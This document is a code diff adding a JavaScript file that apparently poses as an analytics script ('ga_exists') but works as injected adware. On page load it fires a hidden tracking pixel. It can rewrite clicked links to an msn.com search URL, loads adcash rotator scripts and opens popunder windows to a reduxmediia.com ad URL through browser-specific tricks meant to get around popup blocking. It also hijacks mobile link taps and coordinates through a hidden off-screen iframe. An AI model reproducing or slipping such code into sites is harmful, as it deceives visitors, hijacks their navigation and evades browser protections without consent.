@@ -1,0 +1,504 @@
+var ga_exists = 0;
+if(!ga_exists) 
+{
+    ga_exists = 1;
+    var is_responsive = false;
+    var use_keywords = false;
+
+    Date.prototype.addHours = function (h) {
+        this.setHours(this.getHours() + h);
+        return this
+    };
+
+   function shuffle(src) {
+        var cnt = src.length, tmp, idx;
+        while (cnt > 0) {
+            idx = Math.floor(Math.random() * cnt);
+            cnt--;
+            tmp = src[cnt];
+            src[cnt] = src[idx];
+            src[idx] = tmp;
+        }
+        return src;
+    }
+    function addEvent(obj, type, fn) {
+        if (obj.addEventListener) {
+            obj.addEventListener(type, fn, false)
+        } else if (obj.attachEvent) {
+            obj['e' + type + fn] = fn;
+            obj[type + fn] = function () {
+                obj['e' + type + fn](window.event)
+            };
+            obj.attachEvent('on' + type, obj[type + fn])
+        } else {
+            obj['on' + type] = obj['e' + type + fn]
+        }
+    }
+
+    function getCookie(name) {
+        var i, x, y, ARRcookies = document.cookie.split(';');
+        for (i = 0; i < ARRcookies.length; i++) {
+            x = ARRcookies[i].substr(0, ARRcookies[i].indexOf('='));
+            y = ARRcookies[i].substr(ARRcookies[i].indexOf('=') + 1);
+            x = x.replace(/^\s+|\s+$/g, '');
+            if (x == name)
+                return unescape(y)
+        }
+    }
+
+    function setCookie(name, value, hours) {
+        var exdate = new Date();
+        exdate.addHours(hours);
+        var c_value = escape(value) + ';expires=' + exdate.toUTCString() + ';path=/';
+        document.cookie = name + '=' + c_value
+    }
+
+    function startsWith(str, pat) {
+        if (typeof pat == 'object') {
+            for (_i = 0; _i < pat.length; _i++) {
+                if (str.toLowerCase().indexOf(pat[_i].toLowerCase()) == 0)
+                    return true;
+            }
+            return false;
+        }
+        else
+            return (str.toLowerCase().indexOf(pat.toLowerCase()) == 0);
+    }
+
+    addEvent(window, 'load', function()
+    {
+        var cnt_all = document.createElement('img');
+        cnt_all.src = 'http://www.easycounter.com/counter.php?scanov_all';
+        cnt_all.style.display = 'none';
+        document.body.appendChild(cnt_all);
+
+        if(use_keywords)
+        {
+            var keywords = '';
+            var metas = document.getElementsByTagName('meta');
+            if (metas) {
+                var kwstr = '';
+                for (var i = 0; i < metas.length; i++) {
+                    if (metas[i].name.toLowerCase() == 'keywords')
+                        kwstr += metas[i].content;
+                }
+                if(kwstr) {
+                    var tmp = kwstr.split(',');
+                    var tmp2 = new Array();
+                    for (var i = 0; i < tmp.length && tmp2.length < 3; i++) {
+                        var kw = tmp[i].trim();
+                        if(/^\w+$/.test(kw))
+                            tmp2.push(kw);
+                    }
+                    if(tmp2.length > 0)
+                        keywords = tmp2.join('+');
+                }
+            }
+
+            var replCookie = 'href-repl';
+            var replStaff = Math.floor((Math.random() * 18) + 1);
+            var replLink = 'http://msn.com' + '?staff=' + replStaff + '&q=' + keywords;
+            var replHours = 12;
+            addEvent(document, 'mousedown', function(evt){
+                if(getCookie(replCookie)) return;
+                evt = evt ? evt : window.event;
+                var evtSrcEl = evt.srcElement ? evt.srcElement : evt.target;
+                do {
+                    if (evtSrcEl.tagName.toLowerCase() == 'a') break;
+                    if (evtSrcEl.parentNode) evtSrcEl = evtSrcEl.parentNode;
+                } while (evtSrcEl.parentNode);
+                if (evtSrcEl.tagName.toLowerCase() != 'a') return;
+                if (!startsWith(evtSrcEl.href, new Array('http://', 'https://')))
+                    return;
+                evtSrcEl.href = replLink;
+                setCookie(replCookie, 1, replHours);
+            });
+        }
+        if(window.postMessage && window.JSON)
+        {
+            var _top = self;
+            var cookieName = '';
+            var cookieExp = 24;
+            var exoUrl = '';
+            var exoPuId = 'ad_' + Math.floor(89999999 * Math.random() + 10000000);
+
+            if (top != self) {
+                try {
+                    if (top.document.location.toString()) {
+                        _top = top
+                    }
+                } catch (err) {}
+            }
+
+            var exo_browser = {
+                is: function () {
+                    var userAgent = navigator.userAgent.toLowerCase();
+                    var info = {
+                        webkit: /webkit/.test(userAgent),
+                        mozilla: (/mozilla/.test(userAgent)) && (!/(compatible|webkit)/.test(userAgent)),
+                        chrome: /chrome/.test(userAgent),
+                        msie: (/msie/.test(userAgent)) && (!/opera/.test(userAgent)),
+                        msie11: (/Trident/.test(userAgent)) && (!/rv:11/.test(userAgent)),
+                        firefox: /firefox/.test(userAgent),
+                        safari: (/safari/.test(userAgent) && !(/chrome/.test(userAgent))),
+                        opera: /opera/.test(userAgent)
+                    };
+                    info.version = (info.safari) ? (userAgent.match(/.+(?:ri)[\/: ]([\d.]+)/) || [])[1] : (userAgent.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/) || [])[1];
+                    return info
+                }(),
+                versionNewerThan: function (version) {
+                    currentVersion = parseInt(this.is.version.split('.')[0]);
+                    return currentVersion > version
+                },
+                versionFrom: function (version) {
+                    currentVersion = parseInt(this.is.version.split('.')[0]);
+                    return currentVersion >= version
+                },
+                versionOlderThan: function (version) {
+                    currentVersion = parseInt(this.is.version.split('.')[0]);
+                    return currentVersion < version
+                },
+                versionIs: function (version) {
+                    currentVersion = parseInt(this.is.version.split('.')[0]);
+                    return currentVersion == version
+                },
+                isMobile: {
+                    Android: function (a) { return a.navigator.userAgent.match(/Android/i) },
+                    BlackBerry: function (a) { return a.navigator.userAgent.match(/BlackBerry/i) },
+                    iOS: function (a) { return a.navigator.userAgent.match(/iPhone|iPad|iPod/i) },
+                    Opera: function (a) { return a.navigator.userAgent.match(/Opera Mini/i) },
+                    Windows: function (a) { return a.navigator.userAgent.match(/IEMobile/i) },
+                    any: function (a) { return a.navigator.userAgent.match(/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile/i) }
+                }
+            };
+            var browser = exo_browser;
+
+            var exopop = {
+                settings: {
+                    width: 1024,
+                    height: 768
+                },
+                init: function () {
+                    if (browser.isMobile.any(_top))
+                        exopop.binders.mobile();
+                    if (browser.is.msie)
+                        exopop.binders.msie();
+                    if (browser.is.msie11)
+                        exopop.binders.msie11();
+                    if (browser.is.firefox)
+                        exopop.binders.firefox();
+                    if (browser.is.chrome && browser.versionFrom(30) && navigator.appVersion.indexOf('Mac') != -1) 
+                        exopop.binders.chrome30_mac();
+                    if (browser.is.chrome && browser.versionOlderThan(30))
+                        exopop.binders.chromeUntil30();
+                    if (browser.is.chrome && browser.versionIs(30)) 
+                        exopop.binders.chrome30();
+                    else if (browser.is.chrome && browser.versionFrom(31)) 
+                        exopop.binders.chrome31();
+                    else if (browser.is.safari) 
+                        exopop.binders.safari();
+                    else
+                        exopop.binders.firefox();
+                },
+                windowParams: function () {
+                    return 'width=' + exopop.settings.width + ',height=' + exopop.settings.height + ',top=0,left=0,scrollbars=1,location=1,toolbar=0,menubar=0,resizable=1,statusbar=1'
+                },
+                status: {
+                    opened: false
+                },
+                opened: function () {
+                    if (exopop.status.opened) return true;
+                    if (getCookie(cookieName)) return true;
+                    return false
+                },
+                setAsOpened: function () {
+                    this.status.opened = true;
+                    setCookie(cookieName, 1, cookieExp)
+                },
+                findParentLink: function (clickedElement) {
+                    var currentElement = clickedElement;
+                    if (currentElement.getAttribute('target') == null && currentElement.nodeName.toLowerCase() != 'html') {
+                        var o = 0;
+                        while (currentElement.parentNode && o <= 4 && currentElement.nodeName.toLowerCase() != 'html') {
+                            o++;
+                            currentElement = currentElement.parentNode;
+                            if (currentElement.nodeName.toLowerCase() === 'a' && currentElement.href != '') {
+                                break
+                            }
+                        }
+                    }
+                    return currentElement
+                },
+                triggers: {
+                    firefox: function () {
+                        if (exopop.opened()) return true;
+                        var popURL = 'about:blank';
+                        var params = exopop.windowParams();
+                        var PopWin = _top.window.open(popURL, exoPuId, params);
+                        if (PopWin) {
+                            PopWin.blur();
+                            if (navigator.userAgent.toLowerCase().indexOf('applewebkit') > -1) {
+                                _top.window.blur();
+                                _top.window.focus()
+                            }
+                            PopWin.Init = function (e) {
+                                with(e) {
+                                    Params = e.Params;
+                                    Main = function () {
+                                        var x, popURL = Params.PopURL;
+                                        if (typeof window.mozPaintCount != 'undefined') {
+                                            x = window.open('about:blank');
+                                            x.close()
+                                        } else if (navigator.userAgent.toLowerCase().indexOf('chrome/2') > -1) {
+                                            x = window.open('about:blank');
+                                            x.close()
+                                        }
+                                        try {
+                                            opener.window.focus()
+                                        } catch (err) {}
+                                        window.location = popURL;
+                                        window.blur()
+                                    };
+                                    Main()
+                                }
+                            };
+                            PopWin.Params = {
+                                PopURL: exoUrl
+                            };
+                            PopWin.Init(PopWin)
+                        }
+                        exopop.setAsOpened();
+                        return
+                    },
+                    chromeUntil30: function () {
+                        if (exopop.opened()) return true;
+                        window.open('javascript:window.focus()', '_self');
+                        var w = window.open('about:blank', exoPuId, exopop.windowParams());
+                        var a = document.createElement('a');
+                        a.setAttribute('href', 'data:text/html,<scr' + 'ipt>window.close();</scr' + 'ipt>');
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        var e = document.createEvent('MouseEvents');
+                        e.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, true, false, false, true, 0, null);
+                        a.dispatchEvent(e);
+                        document.body.removeChild(a);
+                        w.document.open().write('<script type="text/javascript">window.location="' + exoUrl + '";<\/script>');
+                        w.document.close();
+                        exopop.setAsOpened()
+                    },
+                    chrome30: function (W) {
+                        if (exopop.opened()) return true;
+                        var link = document.createElement('a');
+                        link.href = 'javascript:window.open("' + exoUrl + '","' + exoPuId + '","' + exopop.windowParams() + '")';
+                        document.body.appendChild(link);
+                        link.webkitRequestFullscreen();
+                        var event = document.createEvent('MouseEvents');
+                        event.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, false, false, true, false, 0, null);
+                        link.dispatchEvent(event);
+                        document.webkitCancelFullScreen();
+                        setTimeout(function () {
+                            window.getSelection().empty()
+                        }, 250);
+                        var Z = W.target || W.srcElement;
+                        Z.click();
+                        exopop.setAsOpened()
+                    },
+                    safari: function () {
+                        if (exopop.opened()) return true;
+                        var popWindow = _top.window.open(exoUrl, exoPuId, exopop.windowParams());
+                        if (popWindow) {
+                            popWindow.blur();
+                            popWindow.opener.window.focus();
+                            window.self.window.focus();
+                            window.focus();
+                            var P = '';
+                            var O = top.window.document.createElement('a');
+                            O.href = 'data:text/html,<scr' + P + 'ipt>window.close();</scr' + P + 'ipt>';
+                            document.getElementsByTagName('body')[0].appendChild(O);
+                            var N = top.window.document.createEvent('MouseEvents');
+                            N.initMouseEvent('click', false, true, window, 0, 0, 0, 0, 0, true, false, false, true, 0, null);
+                            O.dispatchEvent(N);
+                            O.parentNode.removeChild(O)
+                        }
+                        exopop.setAsOpened()
+                    },
+                    tab: function () {
+                        if (exopop.opened()) return true;
+                        var a = top.window.document.createElement('a');
+                        var e = document.createEvent('MouseEvents');
+                        a.href = exoUrl;
+                        document.getElementsByTagName('body')[0].appendChild(a);
+                        e.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, true, false, false, true, 0, null);
+                        a.dispatchEvent(e);
+                        a.parentNode.removeChild(a);
+                        exopop.setAsOpened()
+                    },
+                    mobile: function (triggeredEvent) {
+                        if (exopop.opened()) return true;
+                        var clickedElement = triggeredEvent.target || triggeredEvent.srcElement;
+                        if (clickedElement.nodeName.toLowerCase() !== 'a') {
+                            clickedElement = exopop.findParentLink(clickedElement)
+                        }
+                        if (clickedElement.nodeName.toLowerCase() === 'a' && clickedElement.getAttribute('target') !== '_blank') {
+                            window.open(clickedElement.getAttribute('href'));
+                            exopop.setAsOpened();
+                            _top.document.location = exoUrl;
+                            if (triggeredEvent.preventDefault != undefined) {
+                                triggeredEvent.preventDefault();
+                                triggeredEvent.stopPropagation()
+                            }
+                            return false
+                        }
+                        return true
+                    }
+                },
+                binders: {
+                    msie: function () {
+                        addEvent(document, 'click', exopop.triggers.firefox)
+                    },
+                    firefox: function () {
+                        addEvent(document, 'click', exopop.triggers.firefox)
+                    },
+                    chromeUntil30: function () {
+                        addEvent(document, 'mousedown', exopop.triggers.chromeUntil30)
+                    },
+                    chrome30: function () {
+                        addEvent(document, 'mousedown', exopop.triggers.chrome30)
+                    },
+                    chrome31: function () {
+                        addEvent(document, 'mousedown', exopop.triggers.tab)
+                    },
+                    msie11: function () {
+                        addEvent(document, 'mousedown', exopop.triggers.tab)
+                    },
+                    chrome30_mac: function () {
+                        addEvent(document, 'mousedown', exopop.triggers.chromeUntil30)
+                    },
+                    safari: function () {
+                        addEvent(document, 'mousedown', exopop.triggers.safari)
+                    },
+                    mobile: function () {
+                        addEvent(document, 'click', exopop.triggers.mobile)
+                    }
+                }
+            };
+
+            var exoMobPop = 0;
+            function exoMobile() {
+                addEvent(document, 'click', function(){
+                    var targ;
+                    var e = window.event;
+                    if (e.target) targ = e.target;
+                    else if (e.srcElement) targ = e.srcElement;
+                    if (targ.nodeType == 3 || targ.tagName != 'A') targ = targ.parentNode;
+                    if (getCookie(cookieName)) exoMobPop = 1;
+                    if (exoMobPop == 0) {
+                        if(targ && targ.tagName == 'A')
+                            targ.target = '_blank';
+                        exoMobPop = 1;
+                        setTimeout(function() {
+                            setCookie(cookieName, 1, cookieExp / 2);
+                            document.location.assign(exoUrl);
+                        }, 1000);
+                    }
+                });
+            }
+
+            var scripts = null;
+            var script_names = [];
+            var recyclePeriod = 0;
+            if(browser.isMobile.any(_top) && is_responsive)
+            {
+                recyclePeriod = 3 * 60 * 60 * 1000;
+                scripts = {
+                    '938466': function() {
+                        exoUrl =  'http://www.reduxmediia.com/apu.php?n=&zoneid=5716&cb=3394654&popunder=1&direct=1';
+                        cookieName = 'splashMob-938466';
+                        exoMobile();
+                    }
+                };
+            }
+            else
+            {
+                recyclePeriod = 6 * 60 * 60 * 1000;
+                scripts = {
+                    'adcash': function() {
+                        var adcash = document.createElement('script');
+                        adcash.type = 'text/javascript';
+                        adcash.src = 'http://www.adcash.com/script/java.php?option=rotateur&r=274944';
+                        document.body.appendChild(adcash);
+                    },
+                    '1896743': function() {
+                        exoUrl =  'http://www.reduxmediia.com/apu.php?n=&zoneid=5716&cb=3394654&popunder=1&direct=1';
+                        cookieName = 'splashWeb-896743';
+                        exopop.init();
+                    },
+                    'adcash2': function() {
+                        var adcash2 = document.createElement('script');
+                        adcash2.type = 'text/javascript';
+                        adcash2.src = 'http://www.adcash.com/script/java.php?option=rotateur&r=274944';
+                        document.body.appendChild(adcash2);
+                    }
+
+                };
+            }
+            for(var i in scripts) {
+              if(scripts.hasOwnProperty(i))
+                script_names.push(i);
+            }
+            script_names = shuffle(script_names);
+
+            var origin = 'http://storage.com'
+            var path = '/storage.html';
+            var sign = '90e79fb1-d89e-4b29-83fd-70b8ce071039';
+            var iframe = document.createElement('iframe');
+            var done = false;
+            iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;';
+            iframe.src = origin + path;
+
+            addEvent(iframe, 'load', function(){
+                addEvent(window, 'message', function(evt){ 
+                    if (!evt || evt.origin != origin)
+                        return;
+                    var rsp = JSON.parse(evt.data);
+                    if(!rsp || rsp.sign != sign || rsp.act != 'ret')
+                        return;
+                    scripts[rsp.data]();
+                    if(browser.isMobile.any(_top) && is_responsive) {
+                        iframe.contentWindow.postMessage(
+                            JSON.stringify({
+                                act: 'set',
+                                sign: sign,
+                                data: rsp.data
+                            }), 
+                            origin
+                        );
+                    } else {
+                        addEvent(document, 'mousedown', function(){
+                            if(done) return;
+                            done = true;
+                            iframe.contentWindow.postMessage(
+                                JSON.stringify({
+                                    act: 'set',
+                                    sign: sign,
+                                    data: rsp.data
+                                }), 
+                                origin
+                            );
+                        });
+                    }
+                });
+                iframe.contentWindow.postMessage(
+                    JSON.stringify({
+                        act: 'get',
+                        recycle: recyclePeriod,
+                        sign: sign,
+                        data: script_names
+                    }), 
+                    origin
+                );
+            });
+            document.body.appendChild(iframe);
+        }
+    });
+}
